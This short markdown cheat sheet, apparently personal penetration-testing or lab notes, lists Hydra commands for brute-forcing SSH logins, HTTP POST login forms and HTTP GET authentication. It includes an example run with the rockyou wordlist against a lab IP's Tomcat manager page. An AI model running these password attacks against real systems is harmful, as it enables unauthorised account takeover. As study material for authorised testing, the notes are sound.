# SSH

```
hydra -l [username] -P [dictionary] [IP] -t 4 ssh

-l: username
-P: list of passwords
-t: number of threads
```

# POST

```
hydra -l [username] -P [dictionary] [IP] http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

F=incorrect 可以用 burp 截取，看返回的信息
```

# Get

```
hydra -l [username] -P [dictionary] [IP] http-get [directory]

Example Usage:
hydra -l Jan -P /usr/share/wordlists/rockyou.txt -t 64 -vV -f 10.10.178.142 -s 8080 http-get /manager/html
```
